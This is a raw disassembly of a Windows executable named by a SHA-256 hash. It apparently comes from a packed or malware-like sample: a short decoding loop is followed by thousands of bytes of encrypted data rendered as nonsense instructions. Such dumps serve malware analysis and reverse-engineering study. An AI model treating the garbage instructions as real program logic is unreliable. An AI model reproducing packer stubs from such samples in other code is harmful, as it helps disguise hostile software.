
5be8f3842beda8419567ab811bef2b6411eee5e0338b6623ff7542ee49be99a6.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	push   ecx
  411001:	push   ebp
  411002:	mov    ebp,DWORD PTR [esp+0x10]
  411006:	xor    eax,eax
  411008:	test   ebp,ebp
  41100a:	push   esi
  41100b:	mov    DWORD PTR [esp+0x8],eax
  41100f:	mov    esi,0xfffffffd
  411014:	je     0x41107a
  411016:	push   ebx
  411017:	push   edi
  411018:	mov    edi,DWORD PTR [esp+0x18]
  41101c:	mov    DWORD PTR [esp+0x1c],0x1
  411024:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  411028:	add    esi,0x2
  41102b:	inc    esi
  41102c:	mov    BYTE PTR [esi+edi*1],cl
  41102f:	mov    ecx,DWORD PTR [esp+0x24]
  411033:	movzx  ecx,BYTE PTR [eax+ecx*1]
  411037:	mov    edx,DWORD PTR [esp+0x10]
  41103b:	mov    eax,DWORD PTR [esp+0x1c]
  41103f:	add    edx,eax
  411041:	mov    DWORD PTR [esp+0x10],edx
  411045:	ror    eax,cl
  411047:	mov    eax,DWORD PTR [esp+0x10]
  41104b:	mov    edx,eax
  41104d:	shr    edx,0x3
  411050:	mov    ebx,0x1
  411055:	sub    ebx,edx
  411057:	imul   eax,ebx
  41105a:	mov    DWORD PTR [esp+0x10],eax
  41105e:	shl    ebx,0x3
  411061:	mov    bl,BYTE PTR [esi+edi*1]
  411064:	add    bl,cl
  411066:	mov    ecx,DWORD PTR [esp+0x20]
  41106a:	mov    BYTE PTR [esi+edi*1],bl
  41106d:	sub    esi,0x2
  411070:	cmp    esi,ecx
  411072:	jl     0x411024
  411074:	pop    edi
  411075:	pop    ebx
  411076:	pop    esi
  411077:	pop    ebp
  411078:	pop    ecx
  411079:	ret    
  41107a:	inc    esp
  41107b:	adc    BYTE PTR [edi+ecx*1],cl
  41107e:	imul   ecx,edi,0xca957b46
  411084:	inc    esi
  411085:	ror    DWORD PTR [ebp-0x64188d24],1
  41108b:	xchg   cl,cl
  41108d:	pusha  
  41108e:	pop    ecx
  41108f:	push   esi
  411090:	ret    
  411091:	and    ebp,edi
  411093:	dec    esi
  411094:	out    dx,al
  411095:	cmp    al,0x3d
  411097:	lahf   
  411098:	xlat   BYTE PTR ds:[ebx]
  411099:	sahf   
  41109a:	mov    BYTE PTR [edx-0x35cab83d],ch
  4110a0:	cwde   
  4110a1:	mov    ds:0x51571b9,al
  4110a6:	dec    esp
  4110a7:	mov    al,ds:0x4fba56a6
  4110ad:	ds loope 0x41103f
  4110b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110b1:	and    eax,0x34fa722f
  4110b6:	or     BYTE PTR [esi+0x50],bl
  4110b9:	ss scas al,BYTE PTR es:[edi]
  4110bb:	in     eax,dx
  4110bc:	jl     0x4110dd
  4110be:	aas    
  4110bf:	xchg   DWORD PTR [edx+0x7a],esp
  4110c2:	scas   eax,DWORD PTR es:[edi]
  4110c3:	xor    eax,DWORD PTR [edx]
  4110c5:	lods   al,BYTE PTR ds:[esi]
  4110c6:	pop    es
  4110c7:	mov    edx,0x927002d0
  4110cc:	inc    edi
  4110cd:	jp     0x411122
  4110cf:	mov    esp,0xa185174
  4110d4:	in     al,dx
  4110d5:	arpl   bp,si
  4110d7:	pop    ebp
  4110d8:	outs   dx,DWORD PTR ds:[esi]
  4110d9:	ret    
  4110da:	sub    ecx,ecx
  4110dc:	push   esp
  4110dd:	(bad)  
  4110de:	int3   
  4110df:	faddp  st(5),st
  4110e1:	jno    0x411108
  4110e3:	int    0xe8
  4110e5:	in     eax,dx
  4110e6:	xor    BYTE PTR [ecx-0x570825cc],dh
  4110ec:	iret   
  4110ed:	add    DWORD PTR [edx-0x7a],ebp
  4110f0:	xchg   esp,eax
  4110f1:	pop    edi
  4110f2:	push   esi
  4110f3:	mov    al,0xed
  4110f5:	enter  0xdc20,0x6e
  4110f9:	cmp    eax,0xeceb2e0c
  4110fe:	mov    ebx,DWORD PTR [edx+0xb]
  411101:	xor    ebx,esp
  411103:	pop    eax
  411104:	pop    ebp
  411105:	cmp    DWORD PTR [esi+edi*1+0x15],edx
  411109:	rcr    DWORD PTR ds:0x2bf57e4f,1
  41110f:	sbb    BYTE PTR [ebp+edi*8+0x22e1c2d6],0xf
  411117:	in     eax,0x58
  411119:	inc    esp
  41111a:	cmp    al,dl
  41111c:	out    dx,eax
  41111d:	sbb    eax,0xad5140d6
  411122:	pop    esp
  411123:	jbe    0x411104
  411125:	push   edi
  411126:	push   cs
  411127:	stc    
  411128:	inc    esi
  411129:	push   esi
  41112a:	push   ecx
  41112b:	imul   bh
  41112d:	inc    esi
  41112e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41112f:	jnp    0x4110c1
  411131:	jae    0x41111f
  411133:	dec    esi
  411134:	out    0x9e,eax
  411136:	(bad)  
  411137:	lods   eax,DWORD PTR cs:[esi]
  411139:	dec    eax
  41113a:	fs pop es
  41113c:	js     0x4111ad
  41113e:	adc    ecx,0x185e5991
  411144:	sbb    BYTE PTR [ebp-0x7ad24d07],dh
  41114a:	dec    ebp
  41114b:	pushf  
  41114c:	rcr    BYTE PTR [esi+edi*8-0x1fa5a8ef],1
  411153:	fimul  WORD PTR [eax+0x71]
  411156:	leave  
  411157:	and    BYTE PTR [eax-0x5c37356c],bl
  41115d:	sbb    eax,0xbcb06f2e
  411162:	dec    cx
  411164:	mov    esp,0x8cee3b31
  411169:	fs xchg ebp,eax
  41116b:	ds fcomip st,st(3)
  41116e:	add    edx,DWORD PTR [esi]
  411170:	push   ebp
  411171:	jecxz  0x411100
  411173:	mov    edx,0x4a0a187b
  411178:	mov    ?,WORD PTR [esi+0x3]
  41117b:	mov    dl,BYTE PTR [edi+0x3d6c6b9e]
  411181:	dec    ebp
  411182:	jae    0x4111d9
  411184:	mov    edi,0xcc759986
  411189:	iret   
  41118a:	dec    ebx
  41118b:	xchg   esi,eax
  41118c:	mov    al,ds:0xbd338d0a
  411191:	addr16 adc esp,ebp
  411194:	pop    esp
  411195:	pop    ss
  411196:	les    edi,FWORD PTR [edx]
  411198:	in     al,0x5
  41119a:	fdecstp 
  41119c:	push   edi
  41119d:	jbe    0x4111f9
  41119f:	jno    0x411131
  4111a1:	(bad)  
  4111a2:	fiadd  WORD PTR [esi]
  4111a4:	and    bl,al
  4111a6:	jmp    0x1461:0x2f517c1c
  4111ad:	cmp    DWORD PTR [ebx+0x9],esi
  4111b0:	push   ebx
  4111b1:	push   cs
  4111b2:	jnp    0x411139
  4111b4:	add    esp,ebx
  4111b6:	inc    ebx
  4111b7:	xchg   esp,eax
  4111b8:	fld    TBYTE PTR ss:[edi+0x5b3f62dc]
  4111bf:	cmp    eax,0xc0ac1f96
  4111c4:	pop    eax
  4111c5:	loop   0x41123b
  4111c7:	mov    edx,0x45d8630d
  4111cc:	xchg   ecx,eax
  4111cd:	mov    ah,BYTE PTR [eax]
  4111cf:	ins    DWORD PTR es:[edi],dx
  4111d0:	je     0x41117b
  4111d2:	out    dx,eax
  4111d3:	sbb    cl,BYTE PTR [edx+0x49]
  4111d6:	in     al,dx
  4111d7:	sbb    edx,edi
  4111d9:	out    0x5b,al
  4111db:	pusha  
  4111dc:	das    
  4111dd:	sar    BYTE PTR [edx+0x3b75fa43],cl
  4111e3:	mov    bh,0xc9
  4111e5:	cs xor eax,0xba5f299c
  4111eb:	(bad)  
  4111ec:	and    DWORD PTR [edx],edi
  4111ee:	nop
  4111ef:	ja     0x4111ba
  4111f1:	pop    esi
  4111f2:	jne    0x41117c
  4111f4:	push   es
  4111f5:	mov    al,0xd
  4111f7:	retf   0x29a1
  4111fa:	aam    0xd6
  4111fc:	(bad)  
  4111fe:	and    si,WORD PTR [ebx+0x45367480]
  411205:	repnz aaa 
  411207:	call   0x6b5a:0x8e210cb9
  41120e:	mov    bl,0x52
  411210:	ret    0x3d62
  411213:	arpl   WORD PTR ds:0x5ceac9d0,di
  411219:	bswap  ebp
  41121b:	mov    ds:0x8c20171a,eax
  411220:	push   0xffffffea
  411222:	inc    esp
  411223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411224:	xor    DWORD PTR [eax],0x70
  411227:	or     ah,BYTE PTR [ebp+edi*2-0x42767b41]
  41122e:	fistp  WORD PTR [ecx+0x546e872d]
  411234:	pop    esi
  411235:	out    dx,eax
  411236:	mov    al,ds:0xb8dbaf3c
  41123b:	sbb    al,0x39
  41123d:	adc    DWORD PTR [eax+0x1cb380f3],esp
  411243:	and    cl,ch
  411245:	jmp    DWORD PTR [edi-0x37aa0b98]
  41124b:	mov    ecx,0x4c17a45b
  411250:	call   0x2e2:0x1a0f6b8c
  411257:	ror    DWORD PTR [edx+0x7],1
  41125a:	or     DWORD PTR [esi+ebp*4],esp
  41125d:	mov    eax,ds:0xfe5ebff8
  411262:	push   cs
  411263:	sub    BYTE PTR [edi-0x5f],bl
  411266:	stos   BYTE PTR es:[edi],al
  411267:	jmp    0x67f4:0x21b1fe33
  41126e:	div    BYTE PTR ds:[ebx-0x33]
  411272:	(bad)
  411275:	(bad)  
  411276:	add    edx,esp
  411278:	xchg   ebx,eax
  411279:	push   ebx
  41127a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41127b:	xor    BYTE PTR [ebx-0x2ecc0adc],al
  411281:	jmp    0x41121e
  411283:	cmp    al,0x28
  411285:	stos   DWORD PTR es:[edi],eax
  411286:	or     BYTE PTR [edx-0x6bc68c81],ah
  41128c:	add    dl,bl
  41128e:	jl     0x4112e6
  411290:	rcr    BYTE PTR [ebx],cl
  411292:	mov    eax,0x9ec9f322
  411297:	mov    ebp,0xca960c20
  41129c:	hlt    
  41129d:	repz sbb BYTE PTR [eax+0x4f],al
  4112a1:	or     al,0x77
  4112a3:	aad    0x5
  4112a5:	dec    eax
  4112a6:	lods   eax,DWORD PTR ds:[esi]
  4112a7:	icebp  
  4112a8:	popa   
  4112a9:	cli    
  4112aa:	mov    edx,0x5ac6216f
  4112af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112b0:	dec    ebp
  4112b1:	popf   
  4112b2:	push   es
  4112b3:	out    dx,al
  4112b4:	fidiv  WORD PTR [edi-0x5464ab29]
  4112ba:	in     eax,0x91
  4112bc:	(bad)  
  4112bd:	push   cs
  4112be:	js     0x41125e
  4112c0:	loop   0x4112f3
  4112c2:	mov    al,0x9d
  4112c4:	inc    edx
  4112c5:	mov    al,0x5f
  4112c7:	in     eax,0xb6
  4112c9:	pop    eax
  4112ca:	mov    eax,ds:0x2a12f6f8
  4112cf:	cmp    eax,0xa02632d
  4112d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112d5:	cdq    
  4112d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112d7:	lea    esp,[edx]
  4112d9:	jae    0x411352
  4112db:	stos   DWORD PTR es:[edi],eax
  4112dc:	jl     0x411335
  4112de:	lahf   
  4112df:	jl     0x41128a
  4112e1:	sub    eax,0x694be7ec
  4112e6:	push   0xffffffaa
  4112e8:	arpl   WORD PTR [edx+0x16ae078f],dx
  4112ee:	loope  0x4112cb
  4112f0:	arpl   cx,si
  4112f2:	and    ah,BYTE PTR [eax+0x55328887]
  4112f8:	in     eax,0x12
  4112fa:	xor    eax,ecx
  4112fc:	inc    ecx
  4112fd:	pop    ebx
  4112fe:	mov    ebp,0x354525aa
  411303:	sar    BYTE PTR [ecx],1
  411305:	mov    WORD PTR [edi+0x4b],es
  411308:	dec    edx
  411309:	and    edi,edx
  41130b:	mov    ebp,0x55f1fdb7
  411310:	sub    cl,BYTE PTR [ebp-0x4c9966b0]
  411316:	mov    bl,0xc2
  411318:	daa    
  411319:	ficom  DWORD PTR [edx+0x9]
  41131c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41131d:	aad    0x6a
  41131f:	ss cwde 
  411321:	or     edi,edi
  411323:	leave  
  411324:	xchg   DWORD PTR [eax+ebx*4-0x5f6036ad],esi
  41132b:	or     eax,0xde10889
  411330:	xchg   esp,eax
  411331:	lock outs dx,DWORD PTR ds:[esi]
  411333:	scas   eax,DWORD PTR es:[edi]
  411334:	push   esi
  411335:	test   BYTE PTR [ebp+0x729561fa],ah
  41133b:	cwde   
  41133c:	daa    
  41133d:	mov    al,0x3e
  41133f:	mov    esi,0x2a65a84
  411344:	push   esi
  411345:	(bad)  
  411346:	cmp    dl,BYTE PTR [edi]
  411348:	add    DWORD PTR [ebp+0x63],esi
  41134b:	cld    
  41134c:	in     eax,0x5b
  41134e:	mov    cs,WORD PTR [ebp-0x42]
  411351:	rol    BYTE PTR [edx-0x417683d6],cl
  411357:	je     0x4112ec
  411359:	xor    DWORD PTR [edi-0x637b906a],ebp
  41135f:	pop    ebx
  411360:	cmc    
  411361:	push   es
  411362:	in     eax,0x5b
  411364:	pop    edx
  411365:	and    ch,BYTE PTR [ecx+edi*4+0x13]
  411369:	xchg   BYTE PTR [edx+eiz*8],dh
  41136c:	sbb    BYTE PTR [eax+0x67],0xa6
  411370:	xchg   edx,eax
  411371:	ror    al,0x72
  411374:	into   
  411375:	call   0xa2590351
  41137a:	mov    bh,0x37
  41137c:	sub    BYTE PTR ds:0xbdf8df2b,ch
  411382:	jg     0x4113bb
  411384:	cmp    DWORD PTR [ebp+eiz*1+0x7cd33e7f],ebx
  41138b:	push   ecx
  41138c:	daa    
  41138d:	arpl   WORD PTR [edi+0x1932d775],dx
  411393:	mov    esi,0x845ce439
  411398:	nop
  411399:	cmp    ah,BYTE PTR [ebx-0x5cac2f11]
  41139f:	out    0x61,al
  4113a1:	dec    eax
  4113a2:	int    0xff
  4113a4:	add    bh,0x5d
  4113a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113a8:	nop
  4113a9:	mov    al,ds:0x95bc517a
  4113ae:	adc    eax,0x3182b086
  4113b3:	test   BYTE PTR [esi],dl
  4113b5:	xor    DWORD PTR [ecx+0x4c],eax
  4113b8:	iret   
  4113b9:	cmp    DWORD PTR [ebp+0x7388d7d5],ebx
  4113bf:	(bad)  
  4113c0:	sbb    edx,DWORD PTR [edi+ebp*2]
  4113c3:	inc    ebx
  4113c4:	pop    edx
  4113c5:	and    al,bl
  4113c7:	or     DWORD PTR [ebp-0x2772917c],edi
  4113cd:	mov    ah,BYTE PTR [ebp+eiz*1+0x15cfd68c]
  4113d4:	mov    esi,0xc2335f7d
  4113d9:	scas   al,BYTE PTR es:[edi]
  4113da:	xchg   ebx,eax
  4113db:	mov    ah,0x6f
  4113dd:	scas   al,BYTE PTR es:[edi]
  4113de:	push   eax
  4113df:	jno    0x411424
  4113e1:	xor    ah,al
  4113e3:	outs   dx,DWORD PTR ds:[esi]
  4113e4:	fs dec edi
  4113e6:	out    dx,eax
  4113e7:	jmp    0xd1ec8bcf
  4113ec:	int3   
  4113ed:	sub    BYTE PTR [eax],cl
  4113ef:	ficom  DWORD PTR [edx+0x14780dc6]
  4113f5:	call   ebx
  4113f7:	pop    edx
  4113f8:	sbb    ebp,DWORD PTR [eax]
  4113fa:	arpl   WORD PTR ds:0x82878311,bp
  411400:	mov    bl,0x29
  411402:	fwait
  411403:	test   DWORD PTR [edi-0x653e57a],0x917d2740
  41140d:	and    esi,DWORD PTR [edi]
  41140f:	rep lods eax,DWORD PTR ds:[esi]
  411411:	jmp    0x5a460a3c
  411416:	jns    0x411439
  411418:	cdq    
  411419:	stos   DWORD PTR es:[edi],eax
  41141a:	jecxz  0x41142a
  41141c:	gs ja  0x41148d
  41141f:	sub    eax,0x9637fd20
  411424:	pushf  
  411425:	ret    0xc6f1
  411428:	push   0x4d
  41142a:	cwde   
  41142b:	lahf   
  41142c:	or     bh,BYTE PTR [eax+0x73]
  41142f:	test   BYTE PTR [edx-0x33],dh
  411432:	inc    esp
  411433:	push   ecx
  411434:	pop    edx
  411435:	push   ecx
  411436:	mov    edx,0x4c23d353
  41143b:	sahf   
  41143c:	stc    
  41143d:	dec    BYTE PTR [edi]
  41143f:	test   eax,0x523cffda
  411444:	ds jae 0x4113f9
  411447:	std    
  411448:	dec    edi
  411449:	rol    eax,cl
  41144b:	out    0xe5,eax
  41144d:	push   ss
  41144e:	xchg   esp,eax
  41144f:	adc    BYTE PTR [eax-0x55ff9633],0x6
  411456:	outs   dx,DWORD PTR ds:[esi]
  411457:	xor    esi,edi
  411459:	enter  0x6a6a,0x9a
  41145d:	dec    eax
  41145e:	out    dx,eax
  41145f:	add    cl,bh
  411461:	dec    ecx
  411462:	es popa 
  411464:	mov    ah,0x6a
  411466:	stos   BYTE PTR es:[edi],al
  411467:	mov    ah,0x9c
  411469:	pop    ecx
  41146a:	ja     0x41144f
  41146c:	xchg   edx,eax
  41146d:	cs pop ebp
  41146f:	or     eax,0xc8176e4e
  411474:	pop    ebp
  411475:	test   BYTE PTR [edi-0x836949c],al
  41147b:	and    ecx,esp
  41147d:	mov    cs,WORD PTR [edi]
  41147f:	mov    ecx,0x7d46858e
  411484:	(bad)  
  411485:	fdiv   DWORD PTR [ecx+0x604e95e]
  41148b:	add    ecx,ecx
  41148d:	cmc    
  41148e:	push   edx
  41148f:	sbb    BYTE PTR [ebp-0x4e5a1958],ah
  411495:	test   al,0xc
  411497:	ret    0xd8f3
  41149a:	bound  ebp,QWORD PTR [eax+0x3a]
  41149d:	leave  
  41149e:	jmp    0xd8bc:0x91b75851
  4114a5:	add    dh,ah
  4114a7:	jmp    0x17f3bb29
  4114ac:	pushf  
  4114ad:	pop    es
  4114ae:	jmp    0x8bb9:0xac4a42ae
  4114b5:	aas    
  4114b6:	mov    ebx,0xa563611a
  4114bb:	xchg   BYTE PTR [esi+edx*4+0x7572503c],cl
  4114c2:	scas   al,BYTE PTR es:[edi]
  4114c3:	shl    DWORD PTR [ebx-0x3b],0x83
  4114c7:	dec    ebp
  4114c8:	pop    edx
  4114c9:	(bad)  
  4114cb:	xor    al,dl
  4114cd:	push   ebp
  4114ce:	fsubr  DWORD PTR [edi-0x166aabb2]
  4114d4:	xchg   esi,eax
  4114d5:	xor    al,0x0
  4114d7:	sbb    al,0x3f
  4114d9:	cmp    al,0x43
  4114db:	xchg   ebp,eax
  4114dc:	lock dec edx
  4114de:	(bad)  [esp+esi*4]
  4114e1:	test   BYTE PTR ds:0x35859984,dh
  4114e7:	leave  
  4114e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114e9:	stos   DWORD PTR es:[edi],eax
  4114ea:	xor    al,0xa5
  4114ec:	fcom   st(3)
  4114ee:	lods   al,BYTE PTR ds:[esi]
  4114ef:	fnsave [ecx]
  4114f1:	loop   0x4114c4
  4114f3:	jno    0x4114ce
  4114f5:	stos   BYTE PTR es:[edi],al
  4114f6:	fcom   DWORD PTR [ecx+edx*2-0xf85736d]
  4114fd:	aas    
  4114fe:	lss    edi,FWORD PTR [ebx+0x4f]
  411502:	pop    esp
  411503:	jno    0x411510
  411505:	nop
  411506:	retf   
  411507:	loope  0x41153c
  411509:	int    0xc4
  41150b:	loop   0x411506
  41150d:	sbb    eax,0x98e93179
  411512:	cmp    edi,esi
  411514:	xchg   edx,eax
  411515:	or     eax,0xe1e6a1e9
  41151a:	dec    ebp
  41151b:	sbb    ecx,DWORD PTR ds:0xe4f97248
  411521:	std    
  411522:	and    DWORD PTR [esp+ebx*4+0x37],edx
  411526:	ins    BYTE PTR es:[edi],dx
  411527:	pop    si
  411529:	mov    bh,0x4b
  41152b:	aas    
  41152c:	out    0x31,al
  41152e:	jne    0x4114bd
  411530:	psrlw  mm7,mm6
  411533:	or     cl,ah
  411535:	loope  0x4114bb
  411537:	mov    edx,DWORD PTR [esi+edi*2]
  41153a:	loope  0x4114dc
  41153c:	in     al,dx
  41153d:	jae    0x4114d5
  41153f:	scas   eax,DWORD PTR es:[edi]
  411540:	outs   dx,DWORD PTR ds:[esi]
  411541:	retf   0x5177
  411544:	xor    BYTE PTR [edx+0x5e],bh
  411547:	or     al,0x80
  411549:	fld    DWORD PTR [ebx]
  41154b:	sbb    al,0x48
  41154d:	jno    0x41157d
  41154f:	cs and bh,cl
  411552:	(bad)  
  411553:	lds    ebx,FWORD PTR [ebx]
  411555:	dec    esi
  411556:	je     0x411578
  411558:	js     0x411552
  41155a:	aaa    
  41155b:	std    
  41155c:	adc    dl,al
  41155e:	jnp    0x4115de
  411560:	(bad)  
  411561:	repnz sub ebp,edi
  411564:	(bad)
  411569:	in     eax,dx
  41156a:	push   cs
  41156b:	fsub   QWORD PTR [esi-0x4]
  41156e:	pop    edx
  41156f:	xchg   BYTE PTR [esi-0x17],bh
  411572:	(bad)  
  411573:	iret   
  411574:	jbe    0x41158a
  411576:	clc    
  411577:	cli    
  411578:	rol    DWORD PTR [edx+0x62],1
  41157b:	mov    cl,0xe
  41157d:	stos   BYTE PTR es:[edi],al
  41157e:	xchg   ebx,eax
  41157f:	cmp    al,0x85
  411581:	das    
  411582:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411583:	ja     0x4115ff
  411585:	fsubr  DWORD PTR [edi]
  411587:	inc    ecx
  411588:	push   es
  411589:	addr16 popa 
  41158b:	arpl   cx,dx
  41158d:	jg     0x4115ac
  41158f:	push   0xffffffb4
  411591:	pop    es
  411592:	fidivr WORD PTR [esi+ebx*8+0x49]
  411596:	js     0x4115aa
  411598:	lea    edx,[edx-0xe36cdc4]
  41159e:	add    BYTE PTR [esi+0x488d3dda],cl
  4115a4:	in     al,0x5d
  4115a6:	rcl    esp,1
  4115a8:	stos   BYTE PTR es:[edi],al
  4115a9:	outs   dx,DWORD PTR ds:[esi]
  4115aa:	lods   al,BYTE PTR ds:[esi]
  4115ab:	lea    ebp,[edx-0x2]
  4115ae:	push   ecx
  4115af:	test   BYTE PTR [eax],dl
  4115b1:	mov    ebp,DWORD PTR [ecx+0xffc191a]
  4115b7:	in     al,0x84
  4115b9:	leave  
  4115ba:	dec    esp
  4115bb:	idiv   BYTE PTR [eax]
  4115bd:	jge    0x4115e5
  4115bf:	pop    edx
  4115c0:	mov    dl,0x2f
  4115c2:	daa    
  4115c3:	dec    esi
  4115c4:	adc    ecx,DWORD PTR [edx+eax*1-0x44]
  4115c8:	pop    ecx
  4115c9:	lods   eax,DWORD PTR ds:[esi]
  4115ca:	and    eax,0x51394fc6
  4115cf:	rol    BYTE PTR [eax+edx*8],1
  4115d2:	ds jg  0x41162f
  4115d5:	sub    al,0x68
  4115d7:	sbb    dh,dl
  4115d9:	jmp    0x7752676e
  4115de:	push   0xdd851aea
  4115e3:	or     esp,edx
  4115e5:	js     0x41164c
  4115e7:	mov    ah,0x8c
  4115e9:	push   ss
  4115ea:	popa   
  4115eb:	stos   BYTE PTR es:[edi],al
  4115ec:	cmp    eax,0x410a0c6
  4115f1:	in     eax,0x62
  4115f3:	xchg   edi,eax
  4115f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115f5:	out    0xad,eax
  4115f7:	out    dx,al
  4115f8:	js     0x411588
  4115fa:	pop    esp
  4115fb:	std    
  4115fc:	add    al,0x76
  4115fe:	xchg   edi,eax
  411600:	mov    ah,0x90
  411602:	fcmovne st,st(1)
  411604:	xlat   BYTE PTR ds:[ebx]
  411605:	outs   dx,DWORD PTR ds:[esi]
  411606:	icebp  
  411607:	lods   al,BYTE PTR ds:[esi]
  411608:	jb     0x4115ab
  41160a:	test   DWORD PTR [ebp-0x7c],esp
  41160d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41160e:	or     eax,0xb9c9f612
  411613:	in     al,0x74
  411615:	cld    
  411616:	xor    edi,DWORD PTR [eax-0x38e139f9]
  41161c:	mov    BYTE PTR gs:[ecx+esi*2-0x6],0xd5
  411622:	retf   
  411623:	call   0x5d84d26f
  411628:	sbb    al,0x33
  41162a:	and    eax,0xbf461d4c
  41162f:	sar    DWORD PTR es:[esi-0x69],1
  411633:	fidivr WORD PTR ds:0xf58b1eb7
  411639:	rcr    BYTE PTR [ecx+0x2e],1
  41163c:	call   0x43a9:0x9d17a36b
  411643:	aad    0x37
  411645:	mov    cl,0xcf
  411647:	jp     0x411633
  411649:	in     eax,0xf1
  41164b:	jecxz  0x4115ed
  41164d:	pop    esp
  41164e:	pop    ebx
  41164f:	sbb    BYTE PTR [esi+eax*2+0x2d33511b],bl
  411656:	popf   
  411657:	shr    DWORD PTR [eax-0x258b0047],0xdb
  41165e:	arpl   bx,cx
  411660:	xchg   edi,eax
  411661:	loopne 0x411616
  411663:	stc    
  411664:	cmp    al,0xfa
  411666:	mov    edx,0xe8381e00
  41166b:	sbb    edx,eax
  41166d:	mov    ebp,0xf90d0523
  411672:	cmc    
  411673:	and    edi,eax
  411675:	push   ebx
  411676:	div    BYTE PTR [ebx-0x72265c14]
  41167c:	push   0xa3908b0c
  411681:	in     eax,0x55
  411683:	cdq    
  411684:	mov    al,ds:0xc490c956
  411689:	fs xchg esp,eax
  41168b:	js     0x411645
  41168d:	ds jp  0x4116e2
  411690:	jne    0x4116ae
  411692:	mov    dl,0xe9
  411694:	jle    0x411705
  411696:	inc    ecx
  411697:	cwde   
  411698:	xlat   BYTE PTR ds:[ebx]
  411699:	imul   ecx,DWORD PTR [eax+0x71],0x3b
  41169d:	ret    
  41169e:	sub    DWORD PTR [edx+0x533a209],edx
  4116a4:	shl    DWORD PTR [esi-0x76],1
  4116a7:	adc    eax,0x6600b8b5
  4116ac:	lock imul eax,esp,0x1de4b522
  4116b3:	loopne 0x41167c
  4116b5:	(bad)  
  4116b6:	sub    ebp,edx
  4116b8:	jo     0x41172a
  4116ba:	dec    ebp
  4116bb:	xchg   ah,al
  4116bd:	imul   edi,ebp,0xffffffa4
  4116c0:	sbb    esi,DWORD PTR [eax+eax*4-0x5720d8b2]
  4116c7:	pop    ebx
  4116c8:	and    DWORD PTR [esi],eax
  4116ca:	xor    eax,0xb3e2e322
  4116cf:	pop    edi
  4116d0:	inc    ebp
  4116d1:	(bad)  [eax-0x2a2bef44]
  4116d7:	(bad)  
  4116d8:	jp     0x411735
  4116da:	rol    BYTE PTR [esi],1
  4116dc:	cs out 0xc1,al
  4116df:	retf   
  4116e0:	sub    BYTE PTR [edi-0x55],0xcb
  4116e4:	retf   0x345a
  4116e7:	fnstsw WORD PTR [ebx]
  4116e9:	fadd   QWORD PTR [edi+ebp*1+0x6035eb15]
  4116f0:	aam    0x7
  4116f2:	lods   eax,DWORD PTR ds:[esi]
  4116f3:	(bad)  
  4116f4:	mov    bl,ah
  4116f6:	(bad)  
  4116f7:	push   ebp
  4116f8:	inc    esp
  4116f9:	scas   al,BYTE PTR es:[edi]
  4116fa:	call   0xf1488e6b
  4116ff:	(bad)  [ebp+0x49]
  411702:	mov    DWORD PTR [edi-0x5946712],esp
  411708:	lods   eax,DWORD PTR ds:[esi]
  411709:	mov    al,ds:0x9fca97ba
  41170e:	(bad)  
  41170f:	int3   
  411710:	and    ebx,ebp
  411712:	jns    0x411755
  411714:	ficomp WORD PTR [esi+ebp*4+0x41]
  411718:	pop    ebp
  411719:	and    al,0x90
  41171b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41171c:	adc    eax,0xfd4140de
  411721:	adc    al,0xb2
  411723:	cmp    dl,BYTE PTR [ebx]
  411725:	das    
  411726:	int    0xaa
  411728:	lds    ebx,FWORD PTR [edi]
  41172a:	mov    edi,0x5dc66016
  41172f:	jbe    0x41174c
  411731:	mov    eax,ds:0xf01653e7
  411736:	call   0x68509dfb
  41173b:	ror    BYTE PTR [eax],cl
  41173d:	int3   
  41173e:	ds sbb eax,0xdd322f6c
  411744:	cmp    al,0x97
  411746:	cmp    eax,0x80b0c044
  41174b:	(bad)  
  41174c:	je     0x411753
  41174e:	push   ebx
  41174f:	or     BYTE PTR [esi-0x58],0x2
  411753:	lock lods al,BYTE PTR ds:[esi]
  411755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411756:	xchg   esp,eax
  411757:	in     eax,dx
  411758:	daa    
  411759:	xchg   ecx,eax
  41175a:	lods   al,BYTE PTR ds:[esi]
  41175b:	lods   al,BYTE PTR ds:[esi]
  41175c:	jns    0x41177f
  41175e:	dec    edi
  41175f:	in     eax,dx
  411760:	dec    ecx
  411761:	icebp  
  411762:	xchg   edx,eax
  411763:	(bad)  
  411764:	xchg   ebp,eax
  411765:	adc    BYTE PTR [esi+0x4e4dc7de],dl
  41176b:	push   ecx
  41176c:	test   al,0xc9
  41176e:	jle    0x4117ed
  411770:	scas   al,BYTE PTR es:[edi]
  411771:	repz stc 
  411773:	fs jne 0x4117b4
  411776:	sbb    edi,DWORD PTR [edx+0x2b]
  411779:	out    0x8f,eax
  41177b:	loope  0x411777
  41177d:	adc    BYTE PTR [edi-0x5e7dd03a],al
  411783:	add    al,0xde
  411785:	das    
  411786:	aaa    
  411787:	mov    eax,DWORD PTR [edi+ebp*1+0x2e]
  41178b:	jp     0x411778
  41178d:	fs sahf 
  41178f:	sbb    ebx,DWORD PTR [esi]
  411791:	xchg   edi,eax
  411792:	stc    
  411793:	pop    edi
  411794:	mov    esp,0xc86db084
  411799:	or     al,0x5e
  41179b:	and    al,0x74
  41179d:	or     BYTE PTR es:[ebx],dl
  4117a0:	push   ebp
  4117a1:	iret   
  4117a2:	aas    
  4117a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117a4:	cmp    BYTE PTR [esi],ah
  4117a6:	xchg   esi,eax
  4117a7:	pop    edi
  4117a8:	xor    cl,BYTE PTR [esi+0x67]
  4117ab:	and    eax,0x743cca0f
  4117b0:	mov    dl,0x56
  4117b2:	(bad)  
  4117b4:	in     eax,0x29
